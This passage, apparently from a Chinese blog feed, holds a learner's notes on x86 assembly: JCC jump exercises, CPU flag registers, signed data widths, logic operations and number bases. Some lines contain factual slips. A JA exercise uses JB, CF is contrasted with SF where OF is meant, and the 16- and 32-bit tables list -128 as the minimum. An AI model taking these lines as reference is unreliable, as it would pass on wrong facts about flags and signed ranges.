class="headerlink" title="12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0"></a>12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">90</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">CX</span>,<span class="hljs-built_in">AX</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X00401044</span></code></pre></div><p>解析：</p><p>这个与练习10的区别就是不可以让两个数相等。</p><h4 id="13、-JL-JNGE-小于则跳转-有符号数-SF≠-OF"><a href="#13、-JL-JNGE-小于则跳转-有符号数-SF≠-OF" class="headerlink" title="13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF"></a>13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">0XFF</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">0X01</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X00401063</span><span class="hljs-keyword">JL</span> <span class="hljs-number">0X00401063</span></code></pre></div><p>解析：终于到了让我十分迷惑的有无符号JCC的跳转指令，这里做了对比JB JL,看标志位肯定能解决一切（这是对计算机来说），我们没看标志位提前做判断的诀窍：<strong>就是当你用有符号数JCC指令（JG,JL,JLE,JGE，JNG，JNL,JNGE，JNLE）的时候，一定要把两个操作数直接人工看做有符号来看！</strong></p><p><strong>比如这个练习用到了JL,FF就是-1了，那么<code>-1&lt;1</code>这个肯定的，所以JL跳转。但是对于JB，FF就是FF肯定大于1，所以没有跳转。</strong></p><h4 id="14、-JNL-JGE-大于等于则跳转-有符号数-SF-OF"><a href="#14、-JNL-JGE-大于等于则跳转-有符号数-SF-OF" class="headerlink" title="14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF"></a>14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,0CC<span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JGE</span> <span class="hljs-number">0X0040108B</span></code></pre></div><h4 id="15、-JLE-JNG-小于等于则跳转-有符号数-ZF-1-or-SF≠-OF"><a href="#15、-JLE-JNG-小于等于则跳转-有符号数-ZF-1-or-SF≠-OF" class="headerlink" title="15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF"></a>15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,0CC<span class="hljs-keyword">CMP</span> <span class="hljs-built_in">CL</span>,<span class="hljs-built_in">AL</span><span class="hljs-keyword">JGE</span> <span class="hljs-number">0X0040108B</span></code></pre></div><p>这个就是对立15练习，想利用ZF等于1这个跳转，在cmp中没什么好整的，<strong>这两个操作数只能是相同的数，没什么看不看做有无符号的说法</strong>。</p><h4 id="16、-JNLE-JG-大于则跳转-有符号数-ZF-0-and-SF-OF"><a href="#16、-JNLE-JG-大于则跳转-有符号数-ZF-0-and-SF-OF" class="headerlink" title="16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF"></a>16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,FF<span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AX</span>,<span class="hljs-built_in">CX</span><span class="hljs-keyword">JG</span>  <span class="hljs-number">0x004010A6</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,0FF<span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JG</span>  <span class="hljs-number">0x004010A6</span></code></pre></div><p>解析：</p><p>判断一下，第1段代码对还是第2段代码对？</p><p>在原来的观点，对有符号JCC要把两个操作数看做转化后的有符号数对待，<strong>且一定要注意下数据宽度。</strong>在这个例子中，第一段代码是无法实现JG跳转的，<strong>因为其数据宽度的问题，影响到SF,所以其没办法<code>SF=OF</code>就没法跳转。</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>标志寄存器</title>
    <link href="/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <url>/2019/10/06/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><h2 id="部分标志寄存器详细介绍"><a href="#部分标志寄存器详细介绍" class="headerlink" title="部分标志寄存器详细介绍"></a>部分标志寄存器详细介绍</h2><p><img src="/2019/10/06/标志寄存器/images/15704423980063.jpg" srcset="/img/loading.gif" alt><br>需要先熟练记住这几个寄存器的位置和名称：<code>CF PF AF ZF SF OF</code></p><h3 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h3><p>进位标志CF(Carry Flag):如果运算结果的<strong>最高位</strong>产生了一个进位或借位，那么，其值为1，否则其值为0。</p><p>解析：在看运算结果的时候，先提前确定好参与运算的数是<strong>有无符号数</strong>和<strong>它们的数据宽度</strong>。其与PF的难辨难分，重点是看参与运算的数是否为无符号数，这个是程序员写代码的时候定义的。默认都是有符号的，这就主要看后面的PF了。</p><h3 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h3><p>奇偶标志PF(Parity Flag)：PF标志位，根据结果中<strong>最低有效字节(最低8位)</strong>中“1”的个数来确定置1还是清0。如果“1”的个数为偶数，则PF的值为1，否则其值为0。</p><p>解析：这个在很多教材中是错的，这个需要强调根据的是运算结果的最低有效字节，也就是最低8位里面1的个数。</p><h3 id="AF"><a href="#AF" class="headerlink" title="AF"></a>AF</h3><p>辅助进位标志AF(Auxiliary Carry Flag)：<br>如果在“加”操作期间从低半字节（最低四位）到高半字节（高四位）有进位，或者在减法期间的低8位部分从高半字节到低半字节有借位，则将辅助标志设置为（1）。否则，如果不发生这种进位或借位，则清除标志或将其“复位”（设置为0）。<strong>—-（维基百科）</strong></p><p>辅助迸位标志:算数操作結果的第三位〈从0幵始计数〉如果发生了迸位或者借位則將其置为1,否則为0,常在BCD(binary-codedecimal)算木迄算中被使用。<strong>—（百度百科）</strong></p><p>解析：这个还是在很多资料上是错误的，在x86汇编上正确解释如上，也就是<strong>在D0-D7中，D3向D4位进位或者借位，才会置1。</strong>（这个当初老师讲错、百度高赞也是错的，要注意一下）。</p><h3 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h3><p>零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br>解析：引一下常用的<code>xor r8/16/32,r8/16/32</code>对寄存器清零操作。</p><h3 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h3><p>符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。</p><p>解析：还是需要确定数据宽度，看好到底哪个是最高位，然后把<strong>它换成2进制</strong>确定最高位是0还是1.<br>例子：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">20</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">8000</span><span class="hljs-keyword">ADD</span> <span class="hljs-built_in">AX</span>,<span class="hljs-built_in">CX</span></code></pre></div><p><img src="/2019/10/06/标志寄存器/images/15704627287517.jpg" srcset="/img/loading.gif" alt="-w117"><br>这个就是在字上操作，然后相加结果是<code>8020</code>,最高位就是<code>1000</code>，那这个SF就是1了。要注意一下这个sf标志也是看数据宽度的。</p><h3 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h3><p>溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。</p><p>解析：这个常与CF混淆，以为他们没啥区别，但是这个才是正宗的计算机看是否溢出的标志位。</p><p>CF与SF区别：</p><ul><li>进位标志表示<strong>无符号数</strong>运算结果是否超出范围.</li><li>溢出标志表示<strong>有符号数</strong>运算结果是否超出范围.</li></ul><p>溢出主要是给<strong>有符号运算</strong>使用的，在有符号的运算中，有如下的规律：</p><ul><li>正 + 正 = 正 如果结果是负数，则说明有溢出</li><li>负 + 负 = 负 如果结果是正数，则说明有溢出</li><li>正 + 负 永远都不会有溢出.<br><img src="/2019/10/06/标志寄存器/images/15704444932243.jpg" srcset="/img/loading.gif" alt="-w315"><br>结合这个图在应为对PF的判断，非常好用。<strong>判断的时候，一定注意PF是在有符号数做运算的时候去看的，无符号直接看CF就好了。</strong></li></ul><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="写汇编指令只影响CF位的值"><a href="#写汇编指令只影响CF位的值" class="headerlink" title="写汇编指令只影响CF位的值"></a>写汇编指令只影响CF位的值</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,0FE<span class="hljs-keyword">ADD</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">10</span></code></pre></div><p><img src="/2019/10/06/标志寄存器/images/15703705840520.jpg" srcset="/img/loading.gif" alt="-w669"></p><h3 id="写汇编指令只影响PF位的值"><a href="#写汇编指令只影响PF位的值" class="headerlink" title="写汇编指令只影响PF位的值"></a>写汇编指令只影响PF位的值</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">ADD</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">2</span></code></pre></div><p><img src="/2019/10/06/标志寄存器/images/15703707829255.jpg" srcset="/img/loading.gif" alt="-w630"></p><h3 id="写汇编指令只影响AF位的值"><a href="#写汇编指令只影响AF位的值" class="headerlink" title="写汇编指令只影响AF位的值"></a>写汇编指令只影响AF位的值</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">EAX</span>,0F<span class="hljs-keyword">ADD</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-number">1</span></code></pre></div><p><img src="/2019/10/06/标志寄存器/images/15703770643896.jpg" srcset="/img/loading.gif" alt="-w588"></p><h3 id="写汇编指令只影响SF位的值"><a href="#写汇编指令只影响SF位的值" class="headerlink" title="写汇编指令只影响SF位的值"></a>写汇编指令只影响SF位的值</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,0F1<span class="hljs-keyword">ADD</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">1</span></code></pre></div><p><img src="/2019/10/06/标志寄存器/images/15703773573324.jpg" srcset="/img/loading.gif" alt="-w716"></p><h3 id="写汇编指令只影响OF位的值"><a href="#写汇编指令只影响OF位的值" class="headerlink" title="写汇编指令只影响OF位的值"></a>写汇编指令只影响OF位的值</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">80</span><span class="hljs-keyword">SUB</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">10</span></code></pre></div><p>这个需要重视下，练习的时候有点受思维限制了。没有想到用SUB来构造出，<strong>站在80的位置顺时针查10，负-正=正</strong>，来实现溢出完成只影响OF位。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据宽度与逻辑运算</title>
    <link href="/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/"/>
    <url>/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/</url>
    
    <content type="html"><![CDATA[<h1 id="数据宽度与逻辑运算"><a href="#数据宽度与逻辑运算" class="headerlink" title="数据宽度与逻辑运算"></a>数据宽度与逻辑运算</h1><h2 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h2><p>数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。</p><h3 id="对数据宽度的理解和有无符号数"><a href="#对数据宽度的理解和有无符号数" class="headerlink" title="对数据宽度的理解和有无符号数"></a>对数据宽度的理解和有无符号数</h3><h4 id="4位宽度表示"><a href="#4位宽度表示" class="headerlink" title="4位宽度表示"></a>4位宽度表示</h4><p>4位宽度表示：假设计算机只能存储4位2进制数：</p><table><thead><tr><th align="center">0000</th><th align="center">0001</th><th align="center">0010</th><th align="center">0011</th><th align="center">0100</th><th align="center">0101</th><th align="center">0110</th><th align="center">0111</th><th align="center">1000</th><th align="center">1001</th><th align="center">1010</th><th align="center">1011</th><th align="center">1100</th><th align="center">1101</th><th align="center">1110</th><th align="center">1111</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">A</td><td align="center">B</td><td align="center">C</td><td align="center">D</td><td align="center">E</td><td align="center">F</td></tr></tbody></table><p><img src="/2019/10/01/数据宽度与逻辑运算/images/15699374653790.jpg" srcset="/img/loading.gif" alt="-w303"><br>存无符号数时：<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code><br>存有符号数时：<br>    正数：<code>0 1 2 3 4 5 6 7</code><br>    负数：<code>-1 -2 -3 -4 -5 -6 -7 -8</code><br>    其中对应关系：</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td><td>9</td><td>8</td></tr></tbody></table><p>无符号数时：从0到F逆时针依次增大。</p><p>有符号数时：含义从圆中间劈开，正数负数各一半，在F处为最大负数，0处为最小的正数。</p><h5 id="为什么在存有符号数时说开头为1的数就是负数？"><a href="#为什么在存有符号数时说开头为1的数就是负数？" class="headerlink" title="为什么在存有符号数时说开头为1的数就是负数？"></a>为什么在存有符号数时说开头为1的数就是负数？</h5><p>我们只看二进制：<br>| 0  | 1 | 2 | 3 | 4 | 5 | 6 | 7 |<br>| — | — | — | — | — | — | — | — | —  |<br>| 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 |</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>1111</td><td>1110</td><td>1101</td><td>1100</td><td>1011</td><td>1010</td><td>1001</td><td>1000</td></tr><tr><td>很明显就可以看出，当二进制开头为1的时候对应存的数值就是负数了。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>举例：对1011的理解</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1011在我们当做是有符号时就是-5，无符号就是B。<strong>这个完全看我们如何去定义。</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>#### 8位宽度：</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>8位宽度表示：假设计算机只能存储8位2进制数。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><img src="/2019/10/01/数据宽度与逻辑运算/images/15699387217727.jpg" srcset="/img/loading.gif" alt="-w315"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>无符号数：0 1 2 3 4 ……FF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7F<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FF</td><td>FE</td><td>FD</td><td>FC</td><td>FB</td><td>FA</td><td>F9</td><td>F8</td><td>….</td><td>80</td></tr></tbody></table><h4 id="16位宽度"><a href="#16位宽度" class="headerlink" title="16位宽度"></a>16位宽度</h4><p>16位宽度表示：假设计算机只能存储16位2进制数<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699389940266.jpg" srcset="/img/loading.gif" alt="-w317"><br>无符号数：0 1 2 3 4 ……FFFF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7FFF<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FFFF</td><td>FFFE</td><td>FFFD</td><td>FFFC</td><td>FFFB</td><td>FFFA</td><td>FFF9</td><td>FFF8</td><td>….</td><td>8000</td></tr></tbody></table><h4 id="32位宽度"><a href="#32位宽度" class="headerlink" title="32位宽度"></a>32位宽度</h4><p>32位宽度表示：假设计算机只能存储32位2进制数<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699391219590.jpg" srcset="/img/loading.gif" alt="-w378"><br>无符号数：0 1 2 3 4 ……FFFFFFFF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7FFFFFFF<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FFFFFFFF</td><td>FFFFFFFE</td><td>FFFFFFFD</td><td>FFFFFFFC</td><td>FFFFFFFB</td><td>FFFFFFFA</td><td>FFFFFFF9</td><td>FFFFFFF8</td><td>….</td><td>80000000</td></tr><tr><td>### 几个本质问题</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1：计算机除了0和1什么也不认识。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>2：如果存的数据超过数据长度限制，超过的会直接抛弃。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>3：有符号数和无符号数是我们自己用的时候定义的，定义是什么就是什么。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>### 几个重要的计量单位：</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>BYTE  字节  8BIT</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>WORD  字   16BIT 2字节</p><p>DWORD 双字 32BIT 4字节</p><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><h3 id="二进制的逻辑运算："><a href="#二进制的逻辑运算：" class="headerlink" title="二进制的逻辑运算："></a>二进制的逻辑运算：</h3><h4 id="or："><a href="#or：" class="headerlink" title="or："></a>or：</h4><p>或(or |)  只要有一个为1就是1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699395390213.jpg" srcset="/img/loading.gif" alt="-w915"></p><h4 id="and："><a href="#and：" class="headerlink" title="and："></a>and：</h4><p>与(and &amp;)两个都为1才是1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699396122732.jpg" srcset="/img/loading.gif" alt="-w871"></p><h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>异或（xor) 不一样为1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699397540402.jpg" srcset="/img/loading.gif" alt="-w928"><br>ps：错位了。。。</p><h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4><p>非(not !) 1是0 0是1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699398562544.jpg" srcset="/img/loading.gif" alt="-w255"></p><h3 id="逻辑运算的具体应用："><a href="#逻辑运算的具体应用：" class="headerlink" title="逻辑运算的具体应用："></a>逻辑运算的具体应用：</h3><h4 id="想获取某个值得第N位的值是1还是0"><a href="#想获取某个值得第N位的值是1还是0" class="headerlink" title="想获取某个值得第N位的值是1还是0"></a>想获取某个值得第N位的值是1还是0</h4><p>如：8F<br>        <img src="/2019/10/01/数据宽度与逻辑运算/images/15700250078922.jpg" srcset="/img/loading.gif" alt="-w135"><br><strong>方法</strong>：想看下第四位是0还是1，就写个第四个位为1其他都为0的数，然后进行一个与运算，如果出来结果是1.那就证明第四位就是1。</p><h4 id="最简单的加密算法："><a href="#最简单的加密算法：" class="headerlink" title="最简单的加密算法："></a>最简单的加密算法：</h4><p>如：<br>要加密的数据：2015<br>密钥：54<br>因为密钥是两位的，所以要对2015分为<code>20</code>和<code>15</code>。<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15701063449646.jpg" srcset="/img/loading.gif" alt="-w279"><br>进行一次xor运算，出来就是加密后的值：<code>74</code> <code>41</code><br>当用他俩再进行一次xor运算：<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15701064241084.jpg" srcset="/img/loading.gif" alt="-w253"><br>就又变成了2015。这就完成了加密解密。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>进制学习</title>
    <link href="/2019/09/28/%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/09/28/%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="进制学习"><a href="#进制学习" class="headerlink" title="进制学习"></a>进制学习</h1><h2 id="进制的定义"><a href="#进制的定义" class="headerlink" title="进制的定义"></a>进制的定义</h2><p>十进制的定义:由十个符号组成，分别是<code>0 1 2 3 4 5 6 7 8 9</code>逢十进一。</p><p>九进制的定义:由九个符号组成，分别是<code>0 1 2 3 4 5 6 7 8</code>逢九进一。</p><p>十六进制的定义:由十六个符号组成，分别是<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code></p><h2 id="进制的本质"><a href="#进制的本质" class="headerlink" title="进制的本质"></a>进制的本质</h2><p>例如十进制：<code>0 1 2 3 4 5 6 7 8 9</code> 其就是由10个<strong>符号</strong>组成。如果定义其为<code>9 1 5 2 4 7 6 3 8 0</code>,或者换成<img src="/2019/09/28/进制学习/images/15696440221558.jpg" srcset="/img/loading.gif" alt="-w315">,如果用上面的符号进行加密与解密，让不懂进制本质的人解密有很大的阻碍。</p><h2 id="二进制与十六进制的映射关系"><a href="#二进制与十六进制的映射关系" class="headerlink" title="二进制与十六进制的映射关系"></a>二进制与十六进制的映射关系</h2><p><img src="/2019/09/28/进制学习/images/15698464290376.jpg" srcset="/img/loading.gif" alt="-w911"><br>这个需要背会。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="正常认知的进制："><a href="#正常认知的进制：" class="headerlink" title="正常认知的进制："></a>正常认知的进制：</h3><h4 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h4><p>从0写到100</p><p><img src="/2019/09/28/进制学习/images/15713236407261.jpg" srcset="/img/loading.gif" alt="-w900"></p><h4 id="七进制"><a href="#七进制" class="headerlink" title="七进制"></a>七进制</h4><p>编制7进制加法表，乘法表，并计算下面的结果：<strong>23456+54356=？5621-654=？234*65=？</strong><br><img src="/2019/09/28/进制学习/images/15713237049873.jpg" srcset="/img/loading.gif" alt="-w608"><br>7进制加法表：<br><img src="/2019/09/28/进制学习/images/15713237825325.jpg" srcset="/img/loading.gif" alt="-w541"><br>7进制乘法表：<br><img src="/2019/09/28/进制学习/images/15713238136767.jpg" srcset="/img/loading.gif" alt="-w537"><br>粗略计算过程：<br><img src="/2019/09/28/进制学习/images/15713245566592.jpg" srcset="/img/loading.gif" alt="-w275"><br>本质就是直接查表了。</p><h4 id="十六进制："><a href="#十六进制：" class="headerlink" title="十六进制："></a>十六进制：</h4><p>编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？<br><img src="/2019/09/28/进制学习/images/15713241502952.jpg" srcset="/img/loading.gif" alt="-w1387"><br>16进制加法：<br><img src="/2019/09/28/进制学习/images/15713241702367.jpg" srcset="/img/loading.gif" alt="-w1337"><br>16进制乘法表：<br><img src="/2019/09/28/进制学习/images/15713241834458.jpg" srcset="/img/loading.gif" alt="-w1330"><br>粗略计算过程：<br><img src="/2019/09/28/进制学习/images/15713245906184.jpg" srcset="/img/loading.gif" alt="-w238"></p><p>都是查表。</p><h3 id="面向本质的非认知进制："><a href="#面向本质的非认知进制：" class="headerlink" title="面向本质的非认知进制："></a>面向本质的非认知进制：</h3><h4 id="一："><a href="#一：" class="headerlink" title="一："></a>一：</h4><p><strong>9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1</strong></p><p><strong>计算：123 + 234 = ?</strong></p><p>先画个进制表：<br><img src="/2019/09/28/进制学习/images/15699252652163.jpg" srcset="/img/loading.gif" alt="-w489"><br>然后计算：<br><img src="/2019/09/28/进制学习/images/15699253052200.jpg" srcset="/img/loading.gif" alt="-w154"></p><p><strong>解题过程:</strong><br>1)最后一位3+4中的4是第6个数，所以3+4 可以看成从3向后数6个为95，取最后一个5且有一个进位<br>2)最后第二位2+3中的2是第0个数，所以2+3相当3，有一个进位，需要再向后查一个是92，取最后一位2且进1位<br>3)第一位1+2中的2是第0个数，所以1+2相当于1，有一个进位，要再向后查一个，再查一位是7，所以最后是725</p><h4 id="二："><a href="#二：" class="headerlink" title="二："></a>二：</h4><p><strong>10进制定义：由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1</strong></p><p>计算：@$$B + %AC&amp; = ? </p><p>先画个进制表：<br><img src="/2019/09/28/进制学习/images/15699343877953.jpg" srcset="/img/loading.gif" alt="-w583"><br>然后计算：<br><img src="/2019/09/28/进制学习/images/15699344047423.jpg" srcset="/img/loading.gif" alt="-w185"></p><p><strong>解题过程：</strong><br>1)最后一位<code>B+&amp;</code>中的<code>&amp;</code>是第5个数，所以<code>B+&amp;</code>可以看成从B向后数5个为<code>@%</code>，取最后一个<code>%</code>且有一个进位<br>2)最后第二位<code>$+C</code>中的C是第9个数，所以<code>$+C</code>相当从<code>$</code>开始查9个数，前面有一个进位，需要再向后查一个是<code>@$</code>，取最后一位<code>$</code>且进1位<br>3)最后第三位<code>$+A</code>中的A是第7个数，所以<code>$+A</code>相当于从<code>$</code>开始往后查7个，有一个进位，要再向后查一个，再查一位是<code>@!</code>，所以最后是<code>!</code>且进一位<br>4)第一位的<code>@+%</code>中的@是第一个数，所以<code>@+%</code>相当于从<code>%</code>在往后查一位，因为有个进位所以再往后查一位就是<code>&amp;</code>。所以答案就是<code>&amp;!$%</code>。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>经过这次对进制的学习和练习，对进制理解更加的深刻，<strong>它们只是一堆符号</strong>，在达到某个程度后会进位罢了。在复习到c后，有时间可以学习一下写个进制加密的程序。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>逆向学习-滴水公开课</title>
    <link href="/2019/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E6%BB%B4%E6%B0%B4%E5%85%AC%E5%BC%80%E8%AF%BE/"/>
    <url>/2019/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E6%BB%B4%E6%B0%B4%E5%85%AC%E5%BC%80%E8%AF%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向学习-滴水公开课知识总结"><a href="#逆向学习-滴水公开课知识总结" class="headerlink" title="逆向学习-滴水公开课知识总结"></a>逆向学习-滴水公开课知识总结</h1><h3 id="一、内存的读写"><a href="#一、内存的读写" class="headerlink" title="一、内存的读写"></a>一、内存的读写</h3><h4 id="寻址公式一-立即数"><a href="#寻址公式一-立即数" class="headerlink" title="寻址公式一: [立即数]"></a>寻址公式一: [立即数]</h4><p>读取内存的值:<br>    <code>MOV EAX,DWORD PTR DS:[0x13FFC4]    MOV EAX,DYVORD PTR DS:[0x13FFC8]</code><br>    向内存中写入数据:<br>    <code>MOV DWORD PTR DS:[0x13FFC4],eax    MOV DWORD PTR DS:[0x13FFC8].ebx</code><br>    获取内存编号:<br>  <code>LEA EAX,DWORD PTR DS:[0X13FFC4]    LEA EAX,DWORD PTR DS:[ESP+8]</code></p><h4 id="寻址公式二-reg-reg代表寄存器可以是8个通用寄存器中的任意一个"><a href="#寻址公式二-reg-reg代表寄存器可以是8个通用寄存器中的任意一个" class="headerlink" title="寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个"></a>寻址公式二: [reg] 